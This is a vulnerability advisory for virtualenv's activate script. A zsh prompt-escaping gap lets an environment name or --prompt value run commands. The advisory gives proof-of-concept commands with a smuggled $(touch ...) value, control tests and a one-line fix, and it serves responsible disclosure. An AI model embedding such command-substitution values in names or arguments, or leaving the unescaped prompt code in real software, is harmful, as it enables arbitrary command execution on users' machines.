---
title: "virtualenv: Command Execution from the Environment Name in zsh"
date: 2026-10-02
target: "virtualenv (pypa)"
severity: High
identifier: "GHSA-5vjq-rrrf-7h2q"
advisory_url: "https://github.com/pypa/virtualenv/security/advisories/GHSA-5vjq-rrrf-7h2q"
summary: "The shared bash/zsh `activate` script interpolates the environment name — or the `--prompt` value — into `PS1`. The escaping added in 21.13.0 runs under `BASH_VERSION` only, so in zsh with `PROMPT_SUBST` a name like `x$(touch PWNED)y` executes on every prompt draw."
---

## Summary

Virtual environments created by `virtualenv` ship a `bin/activate` script that is
sourced by **both** bash and zsh. When sourced, the script puts the environment name
— `basename $VIRTUAL_ENV`, or the value passed via `--prompt` — into the shell
prompt. Since 21.13.0 the script escapes backslashes, dollar signs and backticks in
that value, but the escaping block is guarded by `[ -n "${BASH_VERSION-}" ]`: bash
gets the escaped value, zsh gets the raw one. zsh with `setopt PROMPT_SUBST`
performs parameter expansion, command substitution and arithmetic expansion on the
prompt **every time it is drawn**, so an environment whose name is
`x$(touch PWNED)y` runs `touch PWNED` as soon as the prompt is redrawn after
`source bin/activate`.

Verified end-to-end on **21.14.3** (the latest release at the time of reporting) and
on **21.9.1**, in real interactive zsh sessions, with controls for bash, for zsh
without `PROMPT_SUBST`, and with a simulated fix. Reported privately; published the
same day as [GHSA-5vjq-rrrf-7h2q](https://github.com/pypa/virtualenv/security/advisories/GHSA-5vjq-rrrf-7h2q).

## Background

`activate` is not two scripts — it is one POSIX-shell script shared by bash and zsh
(`--activators bash` emits it; zsh users source it directly). At the end of sourcing
it, if `VIRTUAL_ENV_DISABLE_PROMPT` is unset, the script prepends the environment
name to `PS1`:

- `VIRTUAL_ENV_PROMPT` defaults to `basename "$VIRTUAL_ENV"`, i.e. the **directory
  name** a user chose when creating the environment; `virtualenv --prompt VALUE`
  sets it explicitly.
- Under bash, the value is re-expanded by the prompt machinery on each redraw (the
  `\u`, `\$`, backslash-escape semantics of `PS1`). Under zsh, expansion is *off* by
  default — **unless `PROMPT_SUBST` is set**, in which case zsh treats the prompt
  string as subject to parameter expansion, command substitution and arithmetic
  expansion at every draw.

`PROMPT_SUBST` is opt-in, but it is the standard way to build a dynamic zsh prompt:
most theme frameworks, and zsh prompt snippets going back decades, require it, and
[virtualenvwrapper's own tips page](https://virtualenvwrapper.readthedocs.io/en/latest/tips.html)
tells zsh users to `setopt PROMPT_SUBST` when overriding the venv prompt. On macOS —
where zsh is the default login shell — it is extremely common.

This is the same class the project had already been fixing in its activator scripts:
`GHSA-p58f-9548-mpm2` (CVE-2026-102925), `GHSA-c947-3pg5-gm8q`, and
`GHSA-8rjx-v5ww-45pp` all concern caller-supplied values changing the meaning of a
generated `activate`, and the project's `SECURITY.md` scope explicitly covers
"caller-supplied values changing the meaning of a generated script". The
21.13.0 hardening (PR #3326) was the fix for the bash prompt case; this report is
about the shell it skipped.

## The vulnerability

Generated `bin/activate`, virtualenv 21.14.3, lines 129–139:

```sh
if [ -z "${VIRTUAL_ENV_DISABLE_PROMPT-}" ] ; then
    _OLD_VIRTUAL_PS1="${PS1-}"
    _VIRTUAL_PROMPT="${VIRTUAL_ENV_PROMPT}"
    # bash re-expands backslashes, dollar signs and backticks in PS1 on every redraw; the guard keeps the
    # bash-only substitution away from POSIX shells such as dash, which reject it with "Bad substitution"
    if [ -n "${BASH_VERSION-}" ]; then
        _VIRTUAL_PROMPT="${_VIRTUAL_PROMPT//\\/\\\\}"
        _VIRTUAL_PROMPT="${_VIRTUAL_PROMPT//\$/\\\$}"
        _VIRTUAL_PROMPT="${_VIRTUAL_PROMPT//\`/\\\`}"
    fi
    PS1="(${_VIRTUAL_PROMPT}) ${PS1-}"
    unset _VIRTUAL_PROMPT
fi
```

The escaping exists precisely because bash redraws expand the prompt — but its
guard limits the guarantee to `BASH_VERSION`. zsh takes the unescaped branch and
stores the raw value in `PS1`, where `PROMPT_SUBST` turns it back into live shell
syntax on every draw. The changelog entry for #3326 states the intent under that
restriction: the values "no longer run as a command each time **bash** draws the
prompt".

zsh supports the same `${var//pattern/replacement}` construct used in the block, so
the fix does not need a new mechanism — it is a one-token extension to the guard
condition (see *The fix* below); the comment's concern about dash ("reject it with
`Bad substitution`") is preserved because dash defines neither `BASH_VERSION` nor
`ZSH_VERSION`.

It is not a one-shot: the substitution happens again each time zsh draws the
prompt, so every redraw after activation re-executes the payload.

## Proof of concept

Tested on Kali (kernel 6.19), zsh 5.9, bash 5.3.9, Python 3.13.12, virtualenv
21.14.3 from PyPI. The payload is `x$(touch PWNED_ZSH)y`; the marker file
`PWNED_ZSH` is what distinguishes "executed" from "displayed as text".

### Interactive — payload in the environment directory name

```
$ python3 -m virtualenv --activators bash 'x$(touch PWNED_ZSH)y'
```

Then, in zsh:

```
% setopt prompt_subst
% source 'x$(touch PWNED_ZSH)y/bin/activate'
% echo $VIRTUAL_ENV_PROMPT
x$(touch PWNED_ZSH)y
```

Raw transcript of the interactive session (pty capture, prompt drawn right after
`source`):

```
kali% setopt prompt_subst
kali% source .../act_e1.sh
(xy) kali% echo FINAL_DONE
FINAL_DONE
(xy) kali%
```

The drawn prompt shows `(xy)` — the command substitution **collapsed the payload
into an empty string** — and the marker exists:

```
$ ls -l PWNED_ZSH
-rw-r--r-- 1 kali kali 0 ... PWNED_ZSH
```

### Same payload via `--prompt`

Identical behavior when the value rides `--prompt` instead of the directory name
(normal directory name, payload passed by e.g. wrapper tooling):

```
$ python3 -m virtualenv --activators bash --prompt 'x$(touch PWNED_ZSH)y' env
% source env/bin/activate          # marker created, prompt shows (xy)
```

### Minimal, non-tty reproduction

```
$ zsh -f -c 'setopt prompt_subst; source act_e1.sh; print -P "$PS1"'
(xy)
# PWNED_ZSH created: True
```

### Controls

The same `activate` script, same payload, three ways — only the
zsh+`PROMPT_SUBST` combination executes:

| Scenario | Prompt shows | Marker |
|---|---|---|
| zsh + `PROMPT_SUBST` (E1/E2) | `(xy)` — payload collapsed | **created** |
| bash `-i`, same script | literal `(x$(touch PWNED_ZSH)y)` | absent |
| zsh **without** `PROMPT_SUBST` | literal `(x$(touch PWNED_ZSH)y)` | absent |
| zsh + `PROMPT_SUBST`, simulated fix (E5) | literal `(x$(touch PWNED_ZSH)y)` | absent |

Raw control transcript (bash):

```
bash-5.3$ source .../act_e3.sh
(x$(touch PWNED_ZSH)y) bash-5.3$ echo FINAL_DONE
FINAL_DONE
```

## Impact

- **Arbitrary command execution** in the user's interactive zsh session, as the
  user, on every prompt draw — the same one-line payload as the bash case the
  project previously fixed, in the shell that was missed.
- **Delivery** matches the same threat model the project already accepted for this
  script class: environment directory names come from unpacked archives, cloned
  repositories, branch/CI job names, or `--prompt` values chosen by wrapper tools; a
  user who sources the generated `activate` in zsh with `PROMPT_SUBST` runs the
  embedded command without any further interaction.
- Preconditions are user-side (zsh + `PROMPT_SUBST`) and treat it exactly as the
  fish case in `GHSA-c947-3pg5-gm8q` treats *its* shell-specific behavior — zsh is
  the default shell on macOS, and `PROMPT_SUBST` is what dynamic-prompt setups
  require, so the affected population is large in practice.

`CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H` — **High (7.8)**, the same vector
the project used for the recent activator advisories in this family.

## The fix

Extend the existing guard so the escaping also runs under zsh (verified locally —
same script, zsh payload inert, value renders literally):

```diff
-    if [ -n "${BASH_VERSION-}" ]; then
+    if [ -n "${BASH_VERSION-}${ZSH_VERSION-}" ]; then
```

dash (and other POSIX shells without the construct) keep taking the safe branch,
exactly as the guard's comment intends.

Testing note: zsh has no faithful equivalent of bash's `${PS1@P}` expansion check,
and `print -P` is *not* a safe stand-in for a real prompt draw on the escaped form
— the reliable tests are (a) drive an interactive zsh over a pty, or (b) assert the
escaped text is present in `PS1` after sourcing. Until a fixed release ships,
mitigations: rename/unpack untrusted environments to safe directory names, don't
pass untrusted `--prompt` values, or keep `PROMPT_SUBST` off for shells in which
untrusted environments are activated.

## Timeline

- 2026-10-02 — Reported to the maintainers via GitHub private vulnerability reporting (PVR).
- 2026-10-02 — Advisory `GHSA-5vjq-rrrf-7h2q` published; remediation developer assigned; fix release pending.

## Disclosure

Public advisory: [GHSA-5vjq-rrrf-7h2q](https://github.com/pypa/virtualenv/security/advisories/GHSA-5vjq-rrrf-7h2q)
(no CVE assigned). Affects `virtualenv <= 21.14.3`.

Related advisories for the same class in the same script family:
[GHSA-p58f-9548-mpm2](https://github.com/pypa/virtualenv/security/advisories/GHSA-p58f-9548-mpm2) (CVE-2026-102925),
[GHSA-c947-3pg5-gm8q](https://github.com/pypa/virtualenv/security/advisories/GHSA-c947-3pg5-gm8q),
[GHSA-8rjx-v5ww-45pp](https://github.com/pypa/virtualenv/security/advisories/GHSA-8rjx-v5ww-45pp).
The bash-side hardening this builds on: [PR #3326](https://github.com/pypa/virtualenv/pull/3326).
